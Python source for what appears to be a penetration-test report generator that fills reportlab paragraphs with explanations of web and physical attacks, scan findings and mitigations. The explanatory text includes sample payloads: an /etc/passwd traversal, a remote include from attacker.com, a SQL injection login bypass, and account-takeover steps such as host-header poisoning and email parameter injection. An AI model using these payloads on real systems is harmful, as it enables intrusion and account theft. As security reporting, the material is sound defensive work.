from reportlab.lib.styles import getSampleStyleSheet
from reportlab.platypus import Paragraph
from reportlab.lib import colors

def create_paragraph(self, name, items):
    if not items:
        return Paragraph(f"No {name} found.", self.styles["ParagraphStyle"])
    else:
        output = f"{len(items)} {name} found:<br/>"
        for item in items:
            output += f"- {item}<br/>"
        return Paragraph(output, self.styles["ParagraphStyle"])

def generate_confidentiality_statement(self):
    text = """
    The information contained within this report is confidential and intended solely for the use of the individual or entity to whom it is addressed. If you are not the intended recipient, be aware that any use, dissemination, distribution, or copying of this document is strictly prohibited. If you have received this document in error, please notify the sender immediately.
    """
    return Paragraph(text, self.styles["ParagraphStyle"])


def generate_omg_cables_rubber_ducky_report(self):
    text = """
    USB devices such as the OMG Cable and Rubber Ducky have become increasingly popular tools for cyber criminals. These devices, which can be easily disguised as regular USB drives or cables, are capable of delivering malicious payloads to unsuspecting victims.

    The threats posed by these devices are significant. An attacker can use an OMG Cable or Rubber Ducky to gain unauthorized access to your systems, download sensitive data, or even take control of a victim's computer. This can lead to significant financial and reputational damage.

    To mitigate these risks, it is crucial to implement strong physical security measures. This includes educating your employees about the dangers of using unknown USB devices, restricting the use of USB ports where possible, and regularly scanning for the presence of unknown devices on your network.
    """
    return Paragraph(text, self.styles["ParagraphStyle"])

def generate_insider_threats_report(self):
    text = """
    Insider threats are a significant concern for any organization. These threats come from individuals who have legitimate access to your systems, such as employees, contractors, or business partners. Because of their access, they can cause substantial damage, whether it's intentional or due to negligence.

    There are numerous ways an insider threat can materialize. For example, an employee may accidentally expose sensitive information, or a disgruntled employee might intentionally cause harm to the organization. Moreover, insiders can also be exploited by external attackers through methods such as social engineering.

    Preventing insider threats requires a comprehensive approach. This includes implementing robust access controls, monitoring user activity, and providing regular security awareness training to your employees. Additionally, fostering a positive workplace environment can also help mitigate the risk of insider threats.
    """
    return Paragraph(text, self.styles["ParagraphStyle"])

def generate_wifi_hacking_mitm_report(self):
    text = """
    Wireless networks are a common target for cyber criminals. By exploiting vulnerabilities in your Wi-Fi network, an attacker can gain unauthorized access to your systems, intercept sensitive data, or launch other attacks.

    One common type of Wi-Fi attack is the Man-in-the-Middle (MiTM) attack. In this type of attack, the attacker intercepts the communication between two parties and can read, modify, or inject new data into the conversation.

    To protect against Wi-Fi hacking and MiTM attacks, it's important to implement strong security measures. This includes using strong encryption for your Wi-Fi networks (such as WPA3), regularly updating your network hardware, and using VPNs for secure communication. In addition, regular penetration testing can help you identify and address vulnerabilities in your network.
    """
    return Paragraph(text, self.styles["ParagraphStyle"])

def generate_bib_report(self):
    text = """
    A new type of attack known as a 'Browser in Browser' (BiB) attack has recently emerged. This technique exploits the use of iframes, HTML documents embedded inside another HTML document, to emulate a secure login page within a website. 

    The attacker controls the content within the iframe, allowing them to mimic the appearance of legitimate websites, complete with fake SSL certificates and domains. Unwary users can be easily tricked into entering their credentials or other sensitive information, believing they are interacting with a secure, trustworthy site. 

    These attacks pose a significant risk because of their sophisticated mimicry and the trust users typically place in visible indicators such as SSL certificates and domain names. They also highlight the potential vulnerabilities introduced by iframes and the importance of treating them with caution.

    To protect against BiB attacks, website developers and administrators should avoid using iframes where possible or restrict them to trusted sources. Users, on the other hand, should be educated on these types of attacks, advised to carefully check the URL before entering sensitive information, and consider using additional protective measures such as two-factor authentication.
    """
    return Paragraph(text, self.styles["ParagraphStyle"])

def generate_git_directory_exposure_report(self):
    text = """
    One commonly overlooked aspect of website security is the potential exposure of directory files. Of particular interest to security professionals and cybercriminals alike is the exposure of .git directories. A .git directory contains the entire version history of a project, including all past commits and respective change logs.
    <br/>
    If a .git directory of a web application is publicly accessible to anyone via the web, it poses a serious security threat. By simply downloading the .git directory, an attacker could gain access to sensitive information, such as hidden source code, configuration data, or possibly credentials and private keys. Additionally, they might uncover valuable information about how the application works, which could facilitate further exploits.
    <br/>
    Tools like GitDumper can be used to download the .git directory from websites where directory listing is disabled. GitDumper essentially circumvents this protection by attempting to download every file in the .git directory individually.
    <br/>
    To mitigate the risk of exposing .git directories, it is recommended to:<br/>
    - Ensure the .git directory is not publicly accessible by any user or crawler. This can be done by adjusting the server configurations or adding rules to the .htaccess file (Apache server) or the configuration file (Nginx server).<br/>
    
    - Regularly monitor and audit the files and directories that are exposed to the public.<br/>
    
    - Use a .gitignore file to prevent committing sensitive data unintentionally.<br/>
    <br/>
    It's crucial to remember that while using tools like Git can streamline development workflow, it's equally important to configure them securely to prevent unintentional data exposure.
    """
    return Paragraph(text, self.styles["ParagraphStyle"])

def generate_exif_data_exposure_report(self):
    text = """
    Exchangeable Image File Format (EXIF) data can be a goldmine of information, which if not handled correctly, can lead to potential security risks. EXIF data is metadata embedded in an image file by the device that captured it, and it can include information such as the device model and make, the date and time the photo was taken, and in some cases, even GPS coordinates.<br/>
    <br/>
    Unintended exposure of EXIF data can be used by attackers in various ways:<br/>
    <br/>
    - Password Guessing: Some people use significant dates or locations as their passwords. If this information is exposed in the EXIF data of a publicly available picture, it could be used to guess a password.<br/>
    - Employee Identification: In a corporate context, pictures taken at an event could reveal who works for the company, providing a potential list of targets for phishing attacks or other forms of social engineering.<br/>
    - Physical Security: GPS coordinates can reveal sensitive locations, such as a home or office address. This could potentially lead to physical security threats.<br/>
    To protect against the risk of EXIF data exposure, it's crucial to strip EXIF data from images before they are uploaded to the internet. This can be done through various tools or software libraries. Moreover, awareness should be spread among employees about the potential risk of sharing unprocessed digital images.
    """
    return Paragraph(text, self.styles["ParagraphStyle"])

def generate_idor_report(self):
    text = """
    Insecure Direct Object References (IDOR) occurs when an application exposes a reference to an internal implementation object. This could be a file, a directory, a database record, or a key. When exploited, IDOR vulnerabilities allow attackers to bypass authorization and directly access resources in the system.<br/>
    <br/>
    Two common ways IDOR can occur are through URLs and cookies:<br/>
    <br/>
    - URL-Based IDOR: This is the most common form of IDOR, where an attacker modifies a URL parameter to gain unauthorized access to resources. For example, changing the value of a 'user_id' parameter in a URL might grant access to another user's account or data.<br/>
    - Cookie-Based IDOR: Here, the object reference is stored in a cookie, which the attacker modifies to access different resources. An example could be modifying the value of a 'session_id' stored in a cookie, potentially granting access to another user's session.<br/>
    <br/>
    Mitigation strategies include:<br/>
    <br/>
    - Always use session-based identifiers, which are only valid for a particular user and session, and are destroyed when the user logs out or after a period of inactivity.<br/>
    - Implement proper access controls that perform server-side checks to ensure the authenticated user has appropriate permissions to access the requested resource.<br/>
    - Avoid exposing direct references to internal objects, like database keys or file paths, in URLs or cookies.<br/>
    - Consider using indirect object references, which map an internal object to a simpler reference ID, which is then exposed to the user.<br/>
    <br/>
    Being aware of and regularly testing for IDOR vulnerabilities can significantly enhance the security of your web application.<br/>
    """
    return Paragraph(text, self.styles["ParagraphStyle"])

def generate_lfi_report(self, domain):
    text = f"""
    Local File Inclusion (LFI) is a type of vulnerability that occurs when an application uses user input to include a file from the local file system. If an application fails to properly validate this input, an attacker could include files that they're not supposed to access, potentially leading to information disclosure or remote code execution.<br/>
    <br/>   
    For example, consider a URL like '{domain}/loadpage.php?file=aboutus.php'. An attacker could manipulate the 'file' parameter to access sensitive files, such as '{domain}/loadpage.php?file=../../../etc/passwd'.
    <br/>
    <br/>
    Mitigation strategies for LFI vulnerabilities include:<br/>
    <br/>
    - Avoiding the use of user input to form a path to local files.<br/>
    - If it's necessary to include local files based on user input, use a white-list approach and map user input to file names.<br/>
    - Implementing proper input validation and sanitization techniques.<br/>
    """
    return Paragraph(text, self.styles["ParagraphStyle"])

def generate_rfi_report(self, domain):
    text = f"""
    Remote File Inclusion (RFI) is similar to LFI, but instead of including local files, the application includes files from remote servers. This could allow an attacker to execute malicious scripts on the vulnerable server.<br/>
    <br/>
    As an example, an attacker could manipulate a URL like '{domain}/loadpage.php?file=aboutus.php' to '{domain}/loadpage.php?file=http://attacker.com/malicious.php'.
    <br/>
    <br/>Mitigation strategies for RFI vulnerabilities are similar to LFI and include:<br/>
    <br/>
    - Avoiding the use of user input to form a path to included files.<br/>
    - Implementing proper input validation and sanitization techniques.<br/>
    - Disabling the inclusion of files from remote servers in the PHP configuration settings (allow_url_include=Off).<br/>
    """
    return Paragraph(text, self.styles["ParagraphStyle"])

def generate_sqli_report(self, domain):
    text = f"""
    SQL Injection (SQLi) occurs when an application includes untrusted data in a SQL query. Attackers can manipulate the SQL queries by injecting malicious SQL code through user inputs, potentially allowing them to view, modify, or delete data in the database.<br/>
    <br/>
    For example, an attacker might manipulate a login form to bypass authentication: entering 'admin' as the username and 'password' OR '1'='1' as the password might grant them admin access if the form is vulnerable to SQLi.
    <br/>
    <br/>Mitigation strategies for SQLi vulnerabilities include:<br/>
    <br/>
    - Using prepared statements or parameterized queries to separate SQL logic from data.<br/>
    - Implementing proper input validation and sanitization techniques.<br/>
    - Regularly updating and patching database management systems to fix known vulnerabilities.<br/>
    """
    return Paragraph(text, self.styles["ParagraphStyle"])

def generate_xss_report(self, domain):
    text = f"""
    Cross-Site Scripting (XSS) vulnerabilities occur when an application includes untrusted data in a webpage without proper validation or escaping, allowing an attacker to inject malicious scripts that can be executed in the victim's browser.<br/>
    <br/>
    For example, an attacker might add a comment on a blog post that includes a script tag with malicious JavaScript. When other users view that comment, the script executes, potentially leading to cookie theft, account hijacking, or defacement of the website.
    <br/>
    <br/>Mitigation strategies for XSS vulnerabilities include:<br/>
    <br/>
    - Implementing proper output encoding when dynamically generating HTML.<br/>
    - Validating and sanitizing user inputs.<br/>
    - Using modern web development frameworks that automatically escape user input.<br/>
    - Implementing a strong Content Security Policy (CSP).<br/>
    """
    return Paragraph(text, self.styles["ParagraphStyle"])

def generate_pimeyes_report(self):
    text = """
    PimEyes is a facial recognition search engine that allows users to upload a picture and search for it across the internet. While the technology behind PimEyes is impressive and can be used for legitimate purposes, it also has potential misuse that warrants discussion.<br/>
    <br/>
    If photos of people within your organization, such as staff profile pictures or video chat screenshots, are publicly accessible, they could be used to gather personal information about them. An attacker could upload the photos to PimEyes and potentially find their social media profiles or other sites where their face appears.<br/>
    <br/>
    These profiles might contain additional personal information or could be used for social engineering attacks. For instance, an attacker could pretend to know an employee based on the information found on their social media profile, and trick them into revealing confidential company information.<br/>
    <br/>
    <br/>To protect against this potential threat:<br/>
    <br/>
    - Be careful about what images are posted publicly. Staff photos or video chat screenshots, particularly those showing faces clearly, should be handled with care.<br/>
    - Regularly educate employees about the risks of sharing too much information on social media. They should understand the potential risks and know how to configure privacy settings properly.<br/>
    - Consider using software to automatically blur or alter faces when publishing staff photos or video chat screenshots.<br/>
    """
    return Paragraph(text, self.styles["ParagraphStyle"])

def generate_file_upload_bypass_report(self, domain):
    text = f"""
    File upload functionality is common in web applications. Users can upload profile pictures, documents, and other files as per their requirements. However, if not secured properly, this feature can lead to critical vulnerabilities. 
    <br/>
    File upload bypass attacks are among the most serious. They occur when an attacker can upload malicious files (like PHP or JavaScript scripts) to the server by bypassing the file type validation process. Once the file is uploaded and executed, this could lead to a complete takeover of the system.
    <br/>
    Here's a potential scenario: 
    <br/>
    Suppose there is a feature on the site '{domain}' that allows users to upload their profile pictures. The site only allows images (like .jpg or .png files), but an attacker discovers that the validation is done based on the file extension rather than the file content. The attacker could then upload a file with a .jpg extension, but the content is actually a PHP script. If the server executes this file, the attacker could potentially gain control over the server.
    <br/>
    <br/>
    <br/>Mitigation strategies for file upload bypass vulnerabilities include:<br/>
    <br/>
    - Implementing strong file validation: Check not just the file extension, but also the file content type (MIME type).<br/>
    - File content checks: For example, for image files, use a library to check if the uploaded file is genuinely an image.<br/>
    - Rename uploaded files: To prevent direct execution, rename files upon upload. Do not allow any user input to create or influence the filename or path.<br/>
    - Limit file permissions: Uploaded files should not have execute permissions.<br/>
    - Isolate uploaded files: Store them outside of the webroot or in a way that they can't be executed.<br/>
    <br/>
    Remember, every detail matters when securing file uploads. Even minor misconfigurations can lead to serious vulnerabilities.
    """
    return Paragraph(text, self.styles["ParagraphStyle"])

def generate_username_enumeration_report(self, domain):
    text = f"""
    A common, but often overlooked, web application vulnerability is Username or Email Enumeration. This occurs when an application inadvertently reveals valid usernames or email addresses in its responses, typically during the login, password reset, or account registration processes.
    <br/>
    Here's how this could be exploited on a website like '{domain}':
    <br/>
    During the login process, if an attacker inputs a random username or email address and the application returns a message such as "Username does not exist" or "Invalid email address", the attacker now knows that those credentials are not in the system. However, if the attacker gets a different response, such as "Invalid password", when inputting a certain username or email, they can infer that the username or email is valid. This allows an attacker to compile a list of valid usernames or email addresses that can be targeted in brute force, dictionary, or credential stuffing attacks.
    To prevent Username or Email Enumeration, the application should not reveal whether the username or email is valid. The error message for invalid credentials should be generic, such as "Invalid username or password". The application should also implement account lockout or delay mechanisms to slow down brute force attacks. 
    <br/>
    However, attackers often attempt to bypass these mechanisms. For example, they might try to make requests from different IP addresses to avoid IP-based lockouts, or use API endpoints that might not have the same security controls as the main website. Therefore, it's crucial to ensure that all parts of your application, including APIs, have appropriate security controls in place.
    """
    return Paragraph(text, self.styles["ParagraphStyle"])

def generate_2fa_bypass_report(self, domain):
    text = f"""
    Two-Factor Authentication (2FA) is a security process in which users provide two different authentication factors to verify themselves. It's designed to provide an additional layer of security, minimizing the chances of unauthorized access. However, if not implemented correctly, 2FA can be bypassed.
    <br/>
    A common 2FA bypass technique involves intercepting the 2FA token, which could be a text message or email sent to the user. Attackers can intercept the token using a variety of methods, such as exploiting vulnerabilities in the Signalling System No. 7 (SS7) protocol used by telecom networks, or by phishing the user to acquire the token.
    <br/>
    Tools like Burp Suite, a popular web application security testing tool, can also be used to manipulate the 2FA process. For instance, on a website like '{domain}', once the 2FA token is submitted, the request can be intercepted using Burp Suite. The attacker can then manipulate the request, such as changing the session ID or other request parameters, before it's sent to the server.
    <br/>
    In another scenario, if the application's logic is flawed, the attacker might be able to bypass the 2FA process entirely. For example, if the application checks for 2FA at the start of the session but not at subsequent stages, an attacker might be able to skip the 2FA step by directly navigating to another part of the application.
    <br/>
    <br/>
    <br/>To prevent 2FA bypasses, it's important to:<br/>
    <br/>
    - Implement checks at every sensitive action or stage in the application, not just at the start of the session.<br/>
    - Encrypt communication to prevent interception of the 2FA token.<br/>
    - Implement secure coding practices to minimize logical flaws in the application.<br/>
    """
    return Paragraph(text, self.styles["ParagraphStyle"])

def generate_account_takeover_report(self, domain):
    text = f"""
    <h2>Account Takeover (ATO) Techniques</h2><br/>
    <br/>
    <h3>1. Leaking Password Reset Token</h3><br/>
    - Trigger a password reset request using the API/UI for a specific email e.g: `test@{domain}.com`.<br/>
    - Inspect the server response and check for `resetToken`.<br/><br/>
    - Then use the token in a URL like `https://{domain}/v3/user/password/reset?resetToken=[THE_RESET_TOKEN]&email=[THE_EMAIL]`.<br/>
    <br/>
    <h3>2. Password Reset Via Username Collision</h3><br/>
    - Register on the system with a username identical to the victim’s username, but with white spaces inserted before and/or after the username. e.g: `"admin "`.<br/>
    - Request a password reset with your malicious username.<br/>
    - Use the token sent to your email and reset the victim password.<br/>
    - Connect to the victim account with the new password.<br/>
    <br/>
    <h3>3. Weak Password Reset Token</h3><br/>
    The password reset token should be randomly generated and unique every time. Try to determine if the token expires or if it’s always the same, in some cases the generation algorithm is weak and can be guessed. The following variables might be used by the algorithm.<br/>
    - Timestamp<br/>
    - UserID<br/>
    - Email of User<br/>
    - Firstname and Lastname<br/>
    - Date of Birth<br/>
    - Cryptography<br/>
    - Number only<br/>
    - Small token sequence ( characters between [A-Z,a-z,0-9])<br/>
    - Token reuse<br/>
    - Token expiration date<br/>
    <br/>
    <h3>4. Password Reset Via Email Parameter</h3><br/>
    This involves manipulating the email parameter in different ways:<br/>
    - Parameter pollution: `email=victim@{domain}.com&email=hacker@{domain}.com`<br/>
    - Carbon copy: `email=victim@{domain}.com%0A%0Dcc:hacker@{domain}.com` or `email=victim@{domain}.com%0A%0Dbcc:hacker@{domain}.com`<br/>
    - Separator: `email=victim@{domain}.com,hacker@{domain}.com`, `email=victim@{domain}.com%20hacker@{domain}.com`, `email=victim@{domain}.com|hacker@{domain}.com`<br/>
    <br/>
    <h3>5. Password Reset Poisoning</h3><br/>
    - Intercept the password reset request in Burp Suite<br/>
    - Add or edit the following headers in Burp Suite : Host: attacker.com, X-Forwarded-Host: attacker.com<br/>
    - Forward the request with the modified header<br/>
    - Look for a password reset URL based on the host header like : `https://attacker.com/reset-password.php?token=TOKEN`<br/>
    <br/>
    <h3>6. Password Reset Takeover</h3><br/>
    <h4>Password Reset Token Leak Via Referrer</h4><br/>
    - Request password reset to your email address<br/>
    - Click on the password reset link<br/>
    - Don’t change password<br/>
    - Click any 3rd party websites (eg: Facebook, twitter)<br/>
    - Intercept the request in Burp Suite proxy<br/>
    - Check if the referer header is leaking password reset token<br/>
    <br/>
    <h3>7. Registration Takeover</h3><br/>
    - Try to register using an existing username<br/>
    - Vary the email in the following ways:<br/>
      - Uppercase<br/>
      - +1@<br/>
      - Add some character in the email<br/>
      - Special characters in the email name (%00, %09, %20)<br/>
      - Black characters after the email: `test@test.com a`<br/>
      - `victim@{domain}.com@attacker.com`<br/>
      - `victim@attacker.com@{domain}.com`<br/>
    """
    return Paragraph(text, self.styles["ParagraphStyle"])


def generate_cloudflare_report(num_unique_subdomains, num_using_cloudflare, cloudflare_status, non_protected_domains):
    # Format the list of non_protected_domains for the report
    non_protected_domains_str = "<br/>".join(f"• {domain}" for domain in non_protected_domains)

    # Modify the text to include the list of non_protected_domains if any exist
    text = f"""
    During the preliminary stage of our penetration test, a thorough initial scan was performed, which identified a total of {num_unique_subdomains} unique response subdomains.
    
    Further examination of these subdomains revealed a noteworthy statistic: {num_using_cloudflare} of them were found to be utilizing Cloudflare as a means of security and performance enhancement. {cloudflare_status}
    """
    if num_using_cloudflare > 0:
        text += f"\n<br/>The following subdomains were found not to be utilizing Cloudflare:<br/>{non_protected_domains_str}<br/>\n"

    text += """
    This is a significant observation that warrants further discussion, due to the possible exposure or leakage of information related to the servers hosting your website. Cloudflare, as a leading provider of content delivery network services, DDoS mitigation, Internet security, and distributed domain-name-server services, offers robust protection for many websites.
    
    However, the reliance on this tool also introduces certain considerations. The most salient concern is that of Distributed Denial of Service (DDoS) attacks, a common threat in the digital landscape.
    
    DDoS attacks involve overwhelming a network with traffic, which, if successful, can lead to extended periods of downtime. This can cause significant disruption to your visitors, impairing their ability to access your website and potentially compromising their experience.
    
    Moreover, it's vital to consider that the identified subdomains could be hosting additional sensitive data or critical functionalities. If these areas were to be compromised due to vulnerabilities, it might not only lead to data breaches but also to malfunctions in essential website operations. Such breaches could lead to a slew of issues ranging from regulatory penalties to reputational damage.
    
    In the end, while Cloudflare offers substantial security benefits, it is crucial that we remain vigilant to the potential risks and vulnerabilities associated with its use. The purpose of this penetration test is not only to uncover potential vulnerabilities but also to provide you with a deeper understanding of your digital security landscape so you can better protect your operations in the future.
    """
    return text

def generate_wordpress_report(num_wordpress_sites, num_non_wordpress_sites, wordpress_sites):
    # Format the list of wordpress_sites for the report
    wordpress_sites_str = "<br/>".join(f"• {site}" for site in wordpress_sites)

    # Modify the text to include the list of wordpress_sites if any exist
    text = f"""
    During the course of our scan, we have identified a total of {num_wordpress_sites} sites that are currently utilizing WordPress as their content management system (CMS).
    
    Out of the total websites, {num_non_wordpress_sites} were found not to be using WordPress.
    """
    if num_wordpress_sites > 0:
        text += f"\n<br/>The following websites were found to be utilizing WordPress:<br/>{wordpress_sites_str}<br/>\n"

    text += """
    This observation is significant due to the security implications associated with the use of WordPress. While WordPress is known for its user-friendly interface and ease of use, it also is known to have security vulnerabilities that can be exploited by malicious actors.
    
    These vulnerabilities can lead to a variety of issues, including unauthorized access, data loss, and website defacement. Moreover, the widespread use of WordPress makes websites using this CMS attractive targets for automated attacks.
    
    As a part of our penetration testing service, we can help you identify potential vulnerabilities in your WordPress setup and provide recommendations to enhance your website security. These could include regular updates of WordPress core, themes, and plugins, and implementing robust security measures such as strong passwords and two-factor authentication.
    """
    return text

def generate_directory_report(num_directories_found, found_directories):
    # Format the list of found_directories for the report
    found_directories_str = "<br/>".join(f"• {directory}" for directory in found_directories)

    text = f"""
    The scan identified a total of {num_directories_found} common directories or files that were found on the websites.
    """
    if num_directories_found > 0:
        text += f"\n<br/>The following directories or files were found:<br/>{found_directories_str}<br/>\n"

    text += """
    This finding is crucial as it may signify potential security issues. Misconfigured file permissions or unsecured directories can lead to unauthorized access and data breaches. Sensitive information such as database credentials or confidential user data might be exposed if these directories are not properly secured.
    
    Additionally, access to certain directories might provide an attacker with valuable information about the system and help them craft more effective attacks. For example, access to the .htaccess file in an Apache server could reveal sensitive configuration data.
    
    It's recommended to ensure all directories and files are secured with appropriate permissions, and any unnecessary or outdated files are removed from the server. Regular audits of your file and directory structure can help detect any potential issues early on.
    """
    return text

def generate_leaks_report(leaks):
    # Default values for leak_count and leaks_str
    leak_count = 0
    leaks_str = ""
    
    if isinstance(leaks, dict):
        if leaks.get('error') == 'true':
            return f"At the time of the current request the database lookup failed due to: {leaks['message']}"
        elif 'message' in leaks and isinstance(leaks['message'], dict):
            # Count the number of keys in 'message' dictionary
            leak_count = len(leaks['message'])
            leaks_str = "<br/>".join(f"• {k}: {len(v)} records" for k, v in leaks['message'].items() if v)
    
    if leak_count == 0:
        text = """
        Congratulations! Our scan didn't find any leaks associated with the domain. This is a good indication of well-implemented security practices. However, it's essential to remain vigilant. Individual employees must ensure they are not using their personal passwords within the company. A continuous effort should be made to educate all staff members about the potential risks and how to mitigate them.
        """
    else:
        text = f"""
        Our scan identified {leak_count} leaks associated with the domain. Here are the leaks we found:<br/>{leaks_str}<br/>
        
        The presence of these leaks suggests a potential security risk. Personal or company emails appearing in public data leaks might be a result of third-party breaches. It's crucial to address these issues as soon as possible to prevent misuse of the information. 

        The risks involved can vary, ranging from phishing attempts and spam to more serious threats like credential stuffing attacks. For each leak, it's recommended to check the context and the data involved to assess its impact properly.

        Additionally, it's important to implement robust password policies within your organization. Employees should be encouraged to use unique passwords and regularly change them. Using a password manager can help manage this process more effectively. Moreover, consider implementing two-factor authentication as an additional layer of security.
        """
    return text
